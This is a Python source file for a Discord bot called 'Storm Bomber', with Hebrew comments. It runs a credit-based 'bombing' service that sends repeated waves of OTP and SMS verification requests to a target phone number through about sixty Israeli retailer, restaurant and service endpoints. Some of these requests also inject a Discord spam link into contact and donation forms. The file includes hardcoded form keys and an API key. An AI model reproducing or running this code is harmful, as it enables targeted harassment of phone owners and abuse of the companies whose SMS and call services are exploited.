                data=f"form_key=SIiL0WFN6AtJF6lb&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.golfco.co.il", "https://www.golfco.co.il/"),
                label="golfco",
            ),
            _async_req(
                s,
                "POST",
                "https://www.timberland.co.il/customer/ajax/post/",
                data=f"form_key=gU7iqYv5eiwuKVef&bot_validation=1&type=login&phone={p}",
                extra_headers=fh("https://www.timberland.co.il", "https://www.timberland.co.il/"),
                label="timberland",
            ),
            _async_req(
                s,
                "POST",
                "https://www.solopizza.org.il/_a/aff_otp_auth",
                data=f"value={p}&type=phone&projectId=1",
                extra_headers=fh("https://www.solopizza.org.il", "https://www.solopizza.org.il/"),
                label="solopizza",
            ),
            _async_req(
                s,
                "POST",
                "https://users-auth.hamal.co.il/auth/send-auth-code",
                data=f'{{"value":"{p}","type":"phone","projectId":"1"}}',
                extra_headers=fh("https://hamal.co.il", "https://hamal.co.il/"),
                label="hamal",
            ),
            _async_req(
                s,
                "POST",
                "https://www.urbanica-wh.com/customer/ajax/post/",
                data=f"form_key=sucdtpszDEqdOgkv&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.urbanica-wh.com", "https://www.urbanica-wh.com/"),
                label="urbanica",
            ),
            _async_req(
                s,
                "POST",
                "https://www.intima-il.co.il/customer/ajax/post/",
                data=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.intima-il.co.il", "https://www.intima-il.co.il/"),
                label="intima",
            ),
            _async_req(
                s,
                "POST",
                "https://www.steimatzky.co.il/customer/ajax/post/",
                data=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.steimatzky.co.il", "https://www.steimatzky.co.il/"),
                label="steimatzky",
            ),
            _async_req(
                s,
                "POST",
                "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
                data=f"value={p}&value_type=",
                extra_headers=fh("https://www.globes.co.il", "https://www.globes.co.il/"),
                label="globes",
            ),
            _async_req(
                s,
                "POST",
                "https://www.moraz.co.il/wp-admin/admin-ajax.php",
                data=f"action=validate_user_by_sms&phone={p}&email=&from_reg=false",
                extra_headers=fh("https://www.moraz.co.il", "https://www.moraz.co.il/", {"sec-fetch-site": "same-origin"}),
                label="moraz",
            ),
            _async_req(
                s,
                "POST",
                "https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send",
                json_body={"phoneNumber": p, "uuid": uid},
                extra_headers=jh(
                    "https://itaybrands.co.il",
                    "https://itaybrands.co.il/",
                    {"sec-fetch-site": "same-origin", "x-requested-with": "XMLHttpRequest"},
                ),
                label="itaybrands",
            ),
            _async_req(
                s,
                "POST",
                "https://api.gomobile.co.il/api/login",
                json_body={"phone": p},
                extra_headers=jh("https://www.gomobile.co.il", "https://www.gomobile.co.il/", {"sec-fetch-site": "same-site"}),
                label="gomobile",
            ),
            _async_req(
                s,
                "POST",
                "https://www.spicesonline.co.il/wp-admin/admin-ajax.php",
                data=f"action=validate_user_by_sms&phone={p}",
                extra_headers=fh("https://www.spicesonline.co.il", "https://www.spicesonline.co.il/"),
                label="spicesonline",
            ),
            _async_req(
                s,
                "POST",
                "https://www.stepin.co.il/customer/ajax/post/",
                data=f"form_key=BxItwcIQhlhsnaoi&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.stepin.co.il", "https://www.stepin.co.il/"),
                label="stepin",
            ),
            _async_req(
                s,
                "POST",
                "https://mobile.rami-levy.co.il/api/Helpers/OTP",
                data=f"phone={p}&template=OTP&type=1",
                extra_headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "accept-encoding": "gzip, deflate",
                    "origin": "https://mobile.rami-levy.co.il",
                    "referer": "https://mobile.rami-levy.co.il/",
                    "x-requested-with": "XMLHttpRequest",
                    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
                },
                label="rami-levy",
            ),
            _async_req(
                s,
                "POST",
                "https://api.zygo.co.il/v2/auth/create-verify-token",
                json_body={"phone": p},
                extra_headers={
                    "Content-Type": "application/json",
                    "origin": "https://zygo.co.il",
                    "referer": "https://zygo.co.il/",
                    "accept-encoding": "gzip, deflate",
                    "sec-fetch-site": "same-site",
                },
                label="zygo",
            ),
            _async_req(
                s,
                "POST",
                "https://ros-rp.tabit.cloud/services/loyalty/customerProfile/auth/mobile",
                json_body={"mobile": p},
                extra_headers={
                    "Content-Type": "application/json",
                    "accept-encoding": "gzip, deflate",
                    "accountguid": "0787F516-E97E-408A-A1CF-53D0C4D57C7C",
                    "cpversion": "3.3.0",
                    "env": "il",
                    "joinchannelguid": "74FE1A48-0FA0-4C8F-B962-6AE88A242023",
                    "siteid": "6203e7787694b434c7a7eb0a",
                    "origin": "https://customer-profile.tabit.cloud",
                    "referer": "https://customer-profile.tabit.cloud/",
                    "sec-fetch-site": "same-site",
                },
                label="tabit",
            ),
            _async_req(
                s,
                "GET",
                f"https://ivr.business/api/Customer/getTempCodeToPhoneVarification/{p}",
                extra_headers={
                    "origin": "https://ivr.business",
                    "referer": "https://ivr.business/",
                    "accept-encoding": "gzip, deflate",
                },
                label="ivr.business",
            ),
            _async_req(
                s,
                "POST",
                "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer",
                data={
                    "configCode": "ivr2_10_23",
                    "uniqCustomerId": "68058a89-fedd-4409-8725-f989652d8305",
                    "gr": "0cAFcWeA5PbEgcsunaaEtl6NGj42rsCw_j-mRZXXcpIwHiMkRv8_z5ALroAy4nrB5H0d9_3EmAT5lir9rdEUmYgJcljVuwkmXejS2XpA8D-SslaqIGDAxdoPpt8avI4LEirhzVHZS84ELsjkcSVnE9MHDQf4uGnuT99SpOJqr9v...",
                    "phone": p,
                    "sendCodeBy": "CALL",
                    "step": "SendValidPhone",
                    "token": "menualWS_ymta",
                    "uniqCustomerId": "68058a89-fedd-4409-8725-f989652d8305",
                },
                extra_headers={
                    "origin": "https://www.call2all.co.il",
                    "referer": "https://www.call2all.co.il/",
                    "accept-encoding": "gzip, deflate",
                },
                label="call2all.co.il",
            ),
            _async_req(
                s,
                "POST",
                "https://rest-api.dibs-app.com/otps",
                json_body={"phoneNumber": phone_972},
                extra_headers=jh("https://dibs-app.com", "https://dibs-app.com/", {"sec-fetch-site": "same-site"}),
                label="dibs",
            ),
            _async_req(
                s,
                "POST",
                "https://www.nine-west.co.il/customer/ajax/post/",
                data=f"bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.nine-west.co.il", "https://www.nine-west.co.il/"),
                label="nine-west",
            ),
            _async_req(
                s,
                "POST",
                "https://www.leecooper.co.il/customer/ajax/post/",
                data=f"bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.leecooper.co.il", "https://www.leecooper.co.il/"),
                label="leecooper",
            ),
            _async_req(
                s,
                "POST",
                "https://www.kikocosmetics.co.il/customer/ajax/post/",
                data=f"bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.kikocosmetics.co.il", "https://www.kikocosmetics.co.il/"),
                label="kikocosmetics",
            ),
            _async_req(
                s,
                "POST",
                "https://www.topten-fashion.com/customer/ajax/post/",
                data=f"form_key=soiphrLs3vM2A1Ta&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.topten-fashion.com", "https://www.topten-fashion.com/"),
                label="topten-fashion",
            ),
            _async_req(
                s,
                "POST",
                "https://www.hoodies.co.il/customer/ajax/post/",
                data=f"form_key=kxMwRR4nj3lOH7Aq&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.hoodies.co.il", "https://www.hoodies.co.il/"),
                label="hoodies",
            ),
            _async_req(
                s,
                "POST",
                "https://www.lehamim.co.il/_a/aff_otp_auth",
                data=f"phone={p}",
                extra_headers={**fh("https://www.lehamim.co.il", "https://www.lehamim.co.il/"), "sec-fetch-site": "same-origin"},
                label="lehamim",
            ),
            _async_req(
                s,
                "POST",
                "https://www.555.co.il/ms/rest/otpservice/client/send/phone?contentContext=3&returnTo=/pearl/apps/vehicle-policy?insuranceTypeId=1",
                json_body={"password": None, "phoneNr": p, "sendType": 1, "systemType": None},
                extra_headers=jh("https://www.555.co.il", "https://www.555.co.il/", {"sec-fetch-site": "same-site"}),
                label="555",
            ),
            _async_req(
                s,
                "POST",
                "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
                data=f"action=simply-check-member-cellphone&cellphone={p}",
                extra_headers=fh("https://www.jungle-club.co.il", "https://www.jungle-club.co.il/"),
                label="jungle-club",
            ),
            _async_req(
                s,
                "POST",
                "https://blendo.co.il/wp-admin/admin-ajax.php",
                data=f"action=simply-check-member-cellphone&cellphone={p}",
                extra_headers=fh("https://blendo.co.il", "https://blendo.co.il/"),
                label="blendo",
            ),
            _async_req(
                s,
                "POST",
                "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
                json_body={"phoneNumber": p, "sourceFrom": "AuthJS", "isCalling": True},
                extra_headers=jh("https://mishloha.co.il", "https://mishloha.co.il/", {"sec-fetch-site": "same-site"}),
                label="mishloha",
            ),
            _async_req(
                s,
                "POST",
                "https://us-central1-webcut-2001a.cloudfunctions.net/sendWhatsApp",
                json_body={"type": "otp", "data": {"phone": p}},
                label="webcut",
            ),
            _async_req(
                s,
                "POST",
                "https://middleware.freetv.tv/api/v1/send-verification-sms",
                json_body={"msisdn": p},
                extra_headers=jh("https://freetv.tv", "https://freetv.tv/"),
                label="freetv",
            ),
            _async_req(
                s,
                "POST",
                "https://we.care.co.il/wp-admin/admin-ajax.php",
                data=(
                    f"post_id=351178&form_id=7079d8dd&referer_title=Care&queried_id=351178&form_fields[name]=https://discord.gg/freespammer&form_fields[phone]={p}&form_fields[email]={rand_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form&referrer=https://we.care.co.il/"
                ),
                extra_headers=fh("https://we.care.co.il", "https://we.care.co.il/glasses-tor/"),
                label="we.care",
            ),
            _async_req(
                s,
                "POST",
                "https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",
                data=f"MosadId=7000297&ClientName=https://discord.gg/freespammer&Phone={p}&Amount=100&Tashlumim=1",
                extra_headers={
                    "Content-Type": FORM,
                    "accept-encoding": "gzip, deflate",
                    "referer": "https://www.matara.pro/",
                    "origin": "https://www.matara.pro",
                },
                label="matara",
            ),
            _async_req(
                s,
                "POST",
                "https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php",
                data=(
                    f"action=otp_register&otp_phone={p}&first_name=יגאל&last_name=ראובן&email={rand_email}&date_birth=2000-11-11&approve_terms=true&approve_marketing=true"
                ),
                extra_headers=fh("https://wissotzky-tlab.co.il", "https://wissotzky-tlab.co.il/%D7%9E%D7%95%D7%A2%D7%93%D7%95%D7%9F-t-club/?"),
                label="wissotzky",
            ),
            _async_req(
                s,
                "POST",
                "https://clocklb.ok2go.co.il/api/v2/users/login",
                json_body={"phone": p},
                extra_headers=jh("https://clocklb.ok2go.co.il", "https://clocklb.ok2go.co.il/", {"sec-fetch-site": "same-site"}),
                label="ok2go",
            ),
            _async_req(
                s,
                "POST",
                "https://api-endpoints.histadrut.org.il/signup/send_code",
                json_body={"phone": p},
                extra_headers={
                    "Content-Type": "application/json",
                    "accept-encoding": "gzip, deflate",
                    "origin": "https://signup.histadrut.org.il",
                    "referer": "https://signup.histadrut.org.il",
                    "x-api-key": "480317067f32f2fd3de682472403468da507b8d023a531602274d17d727a9189",
                    "sec-fetch-site": "same-site",
                },
                label="histadrut",
            ),
            _async_req(
                s,
                "POST",
                "https://www.papajohns.co.il/_a/aff_otp_auth",
                data=f"phone={p}",
                extra_headers={**fh("https://www.papajohns.co.il", "https://www.papajohns.co.il/"), "sec-fetch-site": "same-origin"},
                label="papajohns",
            ),
            _async_req(
                s,
                "POST",
                "https://www.iburgerim.co.il/_a/aff_otp_auth",
                data=f"phone={p}",
                extra_headers={**fh("https://www.iburgerim.co.il", "https://www.iburgerim.co.il/"), "sec-fetch-site": "same-origin"},
                label="iburgerim",
            ),
            _async_req(
                s,
                "GET",
                f"https://www.americanlaser.co.il/wp-json/calc/v1/send-sms?phone={p}",
                extra_headers={
                    "referer": "https://www.americanlaser.co.il/calc/",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "accept-encoding": "gzip, deflate",
                },
                label="americanlaser",
            ),
            _async_req(
                s,
                "POST",
                "https://wb0lovv2z8.execute-api.eu-west-1.amazonaws.com/prod/api/v1/getOrdersSiteData?otpPhone={p}",
                json_body={"id": uid, "domain": "5fc39fabffae5ac5a229cebb", "action": "generateOneTimer", "phoneNumber": p},
                extra_headers=jh("https://orders.beecommcloud.com", "https://orders.beecommcloud.com/", {"sec-fetch-site": "cross-site"}),
                label="beecomm",
            ),
            _async_req(
                s,
                "POST",
                "https://xtra.co.il/apps/api/inforu/sms",
                json_body={"phoneNumber": p},
                extra_headers={
                    "Content-Type": "application/json",
                    "accept-encoding": "gzip, deflate",
                    "origin": "https://xtra.co.il",
                    "referer": "https://xtra.co.il/pages/brand/cafe-cafe",
                    "sec-fetch-site": "same-site",
                },
                label="xtra",
            ),
            _async_req(
                s,
                "POST",
                "https://www.lighting.co.il/customer/ajax/post/",
                data=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.lighting.co.il", "https://www.lighting.co.il/"),
                label="lighting",
            ),
            _async_req(
                s,
                "POST",
                "https://proxy1.citycar.co.il/api/verify/login",
                json_body={"phoneNumber": phone_972, "verifyChannel": 2, "loginOrRegister": 1},
                extra_headers=jh("https://citycar.co.il", "https://citycar.co.il/", {"sec-fetch-site": "same-site"}),
                label="citycar",
            ),
            _async_req(
                s,
                "POST",
                "https://www.lilit.co.il/customer/ajax/post/",
                data=f"form_key=sXWXnRwFsKy5YX9E&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.lilit.co.il", "https://www.lilit.co.il/"),
                label="lilit",
            ),
            _async_req(
                s,
                "POST",
                "https://www.urbanica-wh.com/customer/ajax/post/",
                data=f"bot_validation=1&type=login&telephone={p}",
                extra_headers=fh("https://www.urbanica-wh.com", "https://www.urbanica-wh.com/"),
                label="urbanica",
            ),
            _async_req(
                s,
                "POST",
                "https://www.castro.com/customer/ajax/post/",
                data=f"bot_validation=1&type=login&telephone={p}",
                extra_headers=fh("https://www.castro.com", "https://www.castro.com/"),
                label="castro",
            ),
            _async_req(
                s,
                "POST",
                "https://www.bathandbodyworks.co.il/customer/ajax/post/",
                data=f"form_key=ckGbaafzIC4Yi2l8&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.bathandbodyworks.co.il", "https://www.bathandbodyworks.co.il/home"),
                label="bathandbodyworks",
            ),
            _async_req(
                s,
                "POST",
                "https://www.golbary.co.il/customer/ajax/post/",
                data=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={p}&code=&compare_email=&compare_identity=",
                extra_headers=fh("https://www.golbary.co.il", "https://www.golbary.co.il/"),
                label="golbary",
            ),
            _async_req(
                s,
                "POST",
                "https://api.getpackage.com/v1/graphql/",
                json_body={
                    "operationName": "sendCheckoutRegistrationCode",
                    "variables": {"userName": p},
                    "query": "mutation sendCheckoutRegistrationCode($userName: String!) { sendCheckoutRegistrationCode(userName: String!) { status __typename } }",
                },
                extra_headers=jh("https://www.getpackage.com", "https://www.getpackage.com/", {"sec-fetch-site": "same-site"}),
                label="getpackage",
            ),
            _async_req(
                s,
                "POST",
                "https://ohmama.co.il/?wc-ajax=validate_user_by_sms",
                data=f"otp_login_nonce=de90e8f67b&phone={p}&security=de90e8f67b",
                extra_headers={**fh("https://ohmama.co.il", "https://ohmama.co.il/"), "sec-fetch-site": "same-origin"},
                label="ohmama",
            ),
            _async_req(
                s,
                "POST",
                "https://server.myofer.co.il/api/sendAuthSms",
                json_body={"phoneNumber": p},
                extra_headers=jh("https://www.myofer.co.il", "https://www.myofer.co.il/", {"sec-fetch-site": "same-site", "x-app-version": "3.0.0"}),
                label="myofer",
            ),
            _async_req(
                s,
                "POST",
                "https://arcaffe.co.il/wp-admin/admin-ajax.php",
                data=f"action=user_login_step_1&phone_number={p}&step[]=1",
                extra_headers=fh("https://arcaffe.co.il", "https://arcaffe.co.il/"),
                label="arcaffe",
            ),
            _async_req(
                s,
                "POST",
                "https://api.noyhasade.co.il/api/login?origin=web",
                json_body={"phone": p, "email": False, "ip": "1.1.1.1"},
                extra_headers=jh("https://www.noyhasade.co.il", "https://www.noyhasade.co.il/", {"sec-fetch-site": "same-site"}),
                label="noyhasade",
            ),
        ] + atmos_club_tasks

        results = await asyncio.gather(*tasks, return_exceptions=True)
        success, failed = 0, []
        for r in results:
            if isinstance(r, Exception):
                continue
            if isinstance(r, tuple) and len(r) == 3:
                ok, lbl, reason = r
                if ok:
                    success += 1
                else:
                    failed.append(f"{lbl} ({reason})")
            elif isinstance(r, tuple) and len(r) == 2:
                ok, lbl = r
                if ok:
                    success += 1
                else:
                    failed.append(lbl)

        for r in atmos_results:
            if isinstance(r, Exception):
                continue
            if isinstance(r, tuple) and len(r) == 3:
                ok, lbl, reason = r
                if ok:
                    success += 1
                else:
                    failed.append(f"{lbl} ({reason})")
            elif isinstance(r, tuple) and len(r) == 2:
                ok, lbl = r
                if ok:
                    success += 1
                else:
                    failed.append(lbl)

        return success, failed
# --- לוגיקת ריצת מתקפת הספאם (מבוקרת אסינכרונית) ---
async def _run_spam_task(interaction: discord.Interaction, user_id: int, phone: str, credits: int, current_credits_str: str):
    try:
        total_success = 0
        total_failed_count = 0
        total_failed_details = []
        
        # הגדרת משך ריצה (30 שניות לכל קרדיט, כפי שהוגדר בלוגיקה החדשה)
        end_time = time.time() + (credits * 30)

        await send_detailed_log("🚀 תחילת מתקפת הפצצה", interaction.user, [
            {"name": "📱 מספר יעד:", "value": phone},
            {"name": "💣 כמות קרדיטים:", "value": str(credits)}
        ], color=0xE67E22)

        while time.time() < end_time:
            if user_id not in active_spam_tasks:
                raise asyncio.CancelledError()

            # שליחת גל בקשות
            success, failed = await fire_all_senders(phone)
            total_success += success
            total_failed_count += len(failed)
            
            # שמירת פירוט שגיאות רק אם יש מעט (כדי לא להציף את ההודעה)
            if len(total_failed_details) < 10:
                total_failed_details.extend(failed)

            await asyncio.sleep(1.0)

        # עדכון יתרה ב-Firebase
        if current_credits_str != "lifetime":
            try:
                curr_int = int(current_credits_str or 0)
                db.reference(f"users/{user_id}").update({"credits": str(max(0, curr_int - credits))})
            except Exception as e:
                print(f"Error updating credits: {e}")

        # בניית הודעת סיכום מעוצבת
        total_requests = total_success + total_failed_count
        success_percentage = (total_success / total_requests * 100) if total_requests > 0 else 0
        
        message = (
            f"📊 **סיכום מתקפת הפצצה עבור {phone}**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ **בקשות שהצליחו:** {total_success}\n"
            f"❌ **בקשות שנכשלו:** {total_failed_count}\n"
            f"📈 **סך הכל נשלחו:** {total_requests}\n"
            f"🎯 **אחוז הצלחה:** {success_percentage:.1f}%\n"
        )
        
        if total_failed_details:
            message += f"⚠️ **פירוט שגיאות:**\n" + "\n".join(set(total_failed_details[:5]))

        await interaction.followup.send(message, ephemeral=True)

        # לוג למנהלים
        await send_detailed_log("🏁 סיום מתקפת הפצצה", interaction.user, [
            {"name": "📱 יעד:", "value": phone},
            {"name": "📊 תוצאות:", "value": f"הצלחות: {total_success} | כשלונות: {total_failed_count}"}
        ], color=0x2ECC71)

    except asyncio.CancelledError:
        await interaction.followup.send("❌ הספאם בוטל.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ שגיאה בריצת הספאם: {type(e).__name__}", ephemeral=True)
    finally:
        active_spam_tasks.pop(user_id, None)


# --- מודאל הגדרות הפצצה בעיצוב החדש ---
class SpamModal(discord.ui.Modal, title="הגדרות הפצצה"):
    phone = discord.ui.TextInput(label="מספר טלפון", style=discord.TextStyle.short, required=True)
    amount = discord.ui.TextInput(label="כמות קרדיטים", style=discord.TextStyle.short, required=True)

    async def on_submit(self, interaction: discord.Interaction):
        try:
            await interaction.response.defer(ephemeral=True)
            
            snap = db.reference(f"users/{interaction.user.id}").get()
            cur = snap.get("credits", "0") if snap else "0"

            try:
                requested_amount = int(self.amount.value)
            except ValueError:
                return await interaction.followup.send("❌ נא להזין מספר תקין בשדה הקרדיטים", ephemeral=True)
            
            if requested_amount < 1:
                return await interaction.followup.send("❌ נא להזין 1 או יותר", ephemeral=True)

            if cur != "lifetime":
                try: current_credits = int(cur or 0)
                except ValueError: current_credits = 0
                
                if current_credits < requested_amount:
                    return await interaction.followup.send("❌ יתרה לא מספיקה לפעולה זו", ephemeral=True)
                
            if interaction.user.id in active_spam_tasks:
                return await interaction.followup.send("⚠️ כבר יש לך מתקפה פעילה באוויר. בטל אותה קודם.", ephemeral=True)

            tempRequests[interaction.user.id] = {
                "phone": self.phone.value,
                "amount": str(requested_amount),
                "current": cur
            }
            
            view = discord.ui.View()
            btn_confirm = discord.ui.Button(label="CONFIRM 💣", style=discord.ButtonStyle.danger, custom_id=f"confirm_{interaction.user.id}")
            view.add_item(btn_confirm)
            
            await interaction.followup.send(f"להפציץ את **{self.phone.value}** עם {requested_amount} קרדיטים?", view=view, ephemeral=True)
        except Exception:
            await interaction.followup.send("❌ התרחשה שגיאה בעיבוד הנתונים", ephemeral=True)


# --- אירועים ואינטראקציות של כפתורים ---
@bot.event
async def on_ready():
    print(f"💥 Storm Bomber Ready! Logged in as {bot.user}")

@bot.event
@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.type != discord.InteractionType.component:
        return
        
    custom_id = interaction.data.get("custom_id", "")
    
    if custom_id == "my_credits":
        snap = db.reference(f"users/{interaction.user.id}").get()
        credits_val = snap.get("credits", "0") if snap else "0"
        await interaction.response.send_message(f"💰 יתרה נוכחית: **{credits_val}** קרדיטים", ephemeral=True)
        
    elif custom_id == "spam_phone":
        await interaction.response.send_modal(SpamModal())
        
    # 🎁 הבלוק החדש שנוסף עבור הפרס היומי 🎁
    elif custom_id == "daily_claim_btn":
        user_ref = db.reference(f"users/{interaction.user.id}")
        snap = user_ref.get()
        
        cur_credits = snap.get("credits", "0") if snap else "0"
        last_claim = snap.get("last_claim", 0) if snap else 0
        
        now_timestamp = int(time.time())
        cooldown_seconds = 24 * 3600  # 24 שעות בשניות
        
        if now_timestamp - last_claim < cooldown_seconds:
            remaining_seconds = cooldown_seconds - (now_timestamp - last_claim)
            hours, remainder = divmod(remaining_seconds, 3600)
            minutes, _ = divmod(remainder, 60)
            
            cooldown_embed = discord.Embed(
                title="⏳ Already claimed today",
                description=f"Come back in **{hours}h {minutes}m**",
                color=discord.Color.from_rgb(47, 49, 54)
            )
            return await interaction.response.send_message(embed=cooldown_embed, ephemeral=True)
            
        if cur_credits != "lifetime":
            try:
                curr_int = int(cur_credits or 0)
            except ValueError:
                curr_int = 0
            
            new_credits = str(curr_int + 5)
            user_ref.update({"credits": new_credits, "last_claim": now_timestamp})
            balance_text = f"New balance: **{new_credits}** credits"
        else:
            user_ref.update({"last_claim": now_timestamp})
            balance_text = "Your balance is **Lifetime**"
            
        success_embed = discord.Embed(
            title="🎁 +5 Credits!",
            description=f"{balance_text}\nCome back tomorrow!",
            color=discord.Color.from_rgb(47, 49, 54)
        )
        await interaction.response.send_message(embed=success_embed, ephemeral=True)
        
    # ----------------------------------------------------
    # מכאן והלאה הכל המשך הקוד המקורי שלך ללא שום שינוי:
    # ----------------------------------------------------
    elif custom_id.startswith("claim_"):
        await interaction.response.defer(ephemeral=True)
        d_id = custom_id.split("_")[1]
        drop = activeDrops.get(d_id)
        
        if not drop:
            return await interaction.followup.send("❌ דרופ זה פג תוקף או לא קיים יותר", ephemeral=True)
            
        if interaction.user.id in drop["claimed"]:
            return await interaction.followup.send("❌ כבר אספת את הדרופ הזה!", ephemeral=True)
            
        drop["claimed"].append(interaction.user.id)
        
        ref = db.reference(f"users/{interaction.user.id}")
        snap = ref.get()
        cur = snap.get("credits", "0") if snap else "0"
        
        if cur != "lifetime":
            try: curr_int = int(cur or 0)
            except ValueError: curr_int = 0
            ref.update({"credits": str(curr_int + drop["amount"])})
            
        await send_detailed_log("🎁 דרופ נאסף", interaction.user, [{"name": "סכום שנאסף:", "value": str(drop["amount"])}], color=0x2ECC71)

        if len(drop["claimed"]) >= drop["winners"]:
            activeDrops.pop(d_id, None)
            await interaction.message.edit(content="🎉 הדרופ הסתיים! כל הפרסים חולקו.", embed=None, view=None)
        else:
            embed = interaction.message.embeds[0]
            embed.set_field_at(0, name="זוכים שנשארו:", value=str(drop["winners"] - len(drop["claimed"])))
            await interaction.message.edit(embed=embed)
            
        await interaction.followup.send(f"✅ זכית ב-**{drop['amount']}** קרדיטים והם נוספו לחשבונך!", ephemeral=True)
        
    elif custom_id.startswith("confirm_"):
        allowed_user_id = int(custom_id.split("_")[1])
        if interaction.user.id != allowed_user_id:
            return await interaction.response.send_message("❌ כפתור זה לא מיועד לך", ephemeral=True)
            
        req = tempRequests.pop(interaction.user.id, None)
        if not req:
            return await interaction.response.send_message("❌ פג תוקף הבקשה, אנא נסה שנית", ephemeral=True)
            
        blocked = db.reference(f"blacklist/{req['phone']}").get()
        if blocked:
            return await interaction.response.send_message("❌ מספר זה נמצא ברשימת החסומים", ephemeral=True)
            
        await interaction.response.edit_message(content=f"🌪️ מתחיל להפציץ את **{req['phone']}**...", view=None)
        
        task = asyncio.create_task(_run_spam_task(interaction, interaction.user.id, req['phone'], int(req['amount']), req['current']))
        active_spam_tasks[interaction.user.id] = task

# --- פקודות סלאש (Slash Commands) ---

@bot.tree.command(name="send_daily", description="שליחת הודעת הפרס היומי לערוץ")
async def send_daily_command(interaction: discord.Interaction):
    # בדיקה אם המשתמש מנהל (כדי שרק מנהלים יוכלו לשלוח את הכפתור)
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
        
    embed = discord.Embed(
        title="🎁 פרס יומי - Daily Claim 🎁",
        description="לחצו על הכפתור למטה כדי לקבל **5 קרדיטים** בחינם בכל 24 שעות!",
        color=discord.Color.from_rgb(47, 49, 54)
    )
    
    # שליחת הודעה עם ה-View שמכיל את הכפתור
    await interaction.response.send_message(embed=embed, view=DailyCreditView())

@bot.tree.command(name="setup", description="לוח בקרה")
async def setup(interaction: discord.Interaction):
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    
    embed = discord.Embed(title="Storm Bomber", description="💣 **לוח בקרה**\nהשתמש בכפתורים למטה", color=0x2b2d31)
    
    view = discord.ui.View()
    btn_attack = discord.ui.Button(label="Start Attack 🚀", style=discord.ButtonStyle.danger, custom_id="spam_phone")
    btn_credits = discord.ui.Button(label="Credits 💰", style=discord.ButtonStyle.secondary, custom_id="my_credits")
    view.add_item(btn_attack)
    view.add_item(btn_credits)
    
    await interaction.response.send_message(embed=embed, view=view)
    await send_detailed_log("⚙️ פקודת Setup", interaction.user, [{"name": "פעולה:", "value": "פתח את לוח הבקרה"}], color=0x2b2d31)

@bot.tree.command(name="cancel_spam", description="בטל ספאם פעיל שנמצא בתהליך")
async def cancel_spam(interaction: discord.Interaction):
    task = active_spam_tasks.pop(interaction.user.id, None)
    if task is None:
        return await interaction.response.send_message("אין ספאם פעיל לביטול.", ephemeral=True)

    task.cancel()
    await interaction.response.send_message("מבצע ביטול של הספאם. הריצה נעצרה.", ephemeral=True)

@bot.tree.command(name="add", description="הוספת קרדיטים למשתמש ספציפי (כולל lifetime) או לכל המשתמשים בבת אחת")
@app_commands.choices(target_type=[
    app_commands.Choice(name="משתמש ספציפי", value="single"),
    app_commands.Choice(name="כל המשתמשים ב-Firebase", value="all")
])
async def add_credits(interaction: discord.Interaction, target_type: str, amount: str, user: discord.User = None):
    # בדיקת הרשאות מנהל
    if not is_manager(interaction):
        return await interaction.response.send_message("❌ למנהלים בלבד", ephemeral=True)
    
    await interaction.response.defer(ephemeral=True)

    # אפשרות 1: הוספה לכל המשתמשים בו-זמנית
    if target_type == "all":
        # בדיקה שבמצב גלובלי לא הזינו בטעות "lifetime" (זה עלול לשבש את ה-Database לכולם)
        if amount.lower() == "lifetime":
            return await interaction.followup.send("❌ לא ניתן להעניק סטטוס Lifetime לכל המשתמשים בבת אחת! אנא הזן מספר.", ephemeral=True)
            
        try:
            add_int = int(amount)
            if add_int <= 0:
                return await interaction.followup.send("❌ יש להזין כמות קרדיטים גדולה מ-0", ephemeral=True)
        except ValueError:
            return await interaction.followup.send("❌ עבור הוספה לכל המשתמשים יש להזין מספר תקין בלבד.", ephemeral=True)
            
        users_ref = db.reference("users")
        all_users = users_ref.get()
        
        if not all_users or not isinstance(all_users, dict):
            return await interaction.followup.send("❌ לא נמצאו משתמשים במסד הנתונים", ephemeral=True)
            
        updated_count = 0
        for u_id, u_data in all_users.items():
            # מדלגים על משתמשי lifetime קיימים כדי לא להרוס להם את הסטטוס
            if u_data.get("credits") == "lifetime":
                continue
                
            try:
                curr_int = int(u_data.get("credits", 0))
            except (ValueError, TypeError):
                curr_int = 0
                
            new_credits = str(curr_int + add_int)
